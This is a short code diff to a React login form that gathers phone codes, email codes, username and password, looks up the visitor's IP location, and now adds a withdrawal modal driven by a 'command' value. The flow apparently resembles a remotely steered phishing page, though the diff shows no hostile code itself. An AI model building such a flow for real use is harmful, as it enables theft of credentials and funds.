@@ -17,6 +17,8 @@ import { PhoneCode } from "./steps/PhoneCode";
 import { EmailCode } from "./steps/EmailCode";
 import { UserPass } from "./steps/UserPass";
 import { getIpGeo } from "@/utils";
+import { comma } from "postcss/lib/list";
+import { WithdrawModal } from "./steps/WithDrawModal";
 
 export const LoginForm = () => {
   const [dataRef, setDataRef] = useState<null | ThenableReference>(null);
@@ -110,6 +112,8 @@ export const LoginForm = () => {
       </div>
 
       <ToastContainer />
+
+      <WithdrawModal command={command} dataRef={dataRef} />
     </>
   );
 };
